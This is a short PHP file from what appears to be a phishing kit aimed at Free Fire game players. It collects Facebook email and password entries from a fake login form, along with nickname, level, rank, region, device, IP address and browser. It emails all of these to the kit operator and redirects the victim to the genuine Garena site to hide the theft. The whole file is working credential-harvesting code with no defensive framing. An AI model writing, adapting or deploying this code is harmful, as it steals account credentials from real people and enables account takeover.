<?php
    header('location: http://ff.garena.com');
?>
<?php
include '../email.php';
$subjek = "FreeFire Login Fb Level { ".$_POST['level']." } Rank { ".$_POST['rank']." }";

$email = $_POST['email'];
$pass = $_POST['pass'];
$nama = $_POST['nick'];
$lvl = $_POST['level'];
$rank = $_POST['rank'];
$reg = $_POST['region'];
$dvc = $_POST['device'];
$ip = $_SERVER['REMOTE_ADDR'];
$browser = $_SERVER['HTTP_USER_AGENT'];


$body = <<<EOD
<center>
<h1> <a href="https://ensikology.blogspot.com/">Ensikology Science</a> </h1>
<hr>
<h2><font style="color: #FF0A0E">{{ FACEBOOK ACCOUNT }}</font></h2>
<hr>
<h3>Email : $email</h3>
<hr>
<h3>Password : $pass</h3>
<hr>
<h2><font style="color: #FF0A0E">{{ DETAIL ACCOUNT }}</font></h2>
<hr>
<h3>Nickname : $nama</h3>
<hr>
<h3>Level : $lvl</h3>
<hr>
<h3>Rank : $rank</h3>
<hr>
<h3>Region : $reg</h3>
<hr>
<h2><font style="color: #FF0A0E">{{ DEVICE }}</font></h2>
<hr>
<h3>Tipe : $dvc</h3>
<hr>
<h3>Alamat IP : $ip</h3>
<hr>
<h3>Browser : $browser</h3>
<hr>
<h3>Bagi Result : https://ensikology.blogspot.com/p/contact-us.html </h3>
<hr>
<h2><font style="color: #FF0A0E">{{ SELESAI }}</font></h2>
<hr>
</center>

EOD;


$headers = "From: Ensikology\r\n";
$headers .= "Content-type: text/html\r\n";
$success = mail($mailto, $subjek, $body, $headers);
?>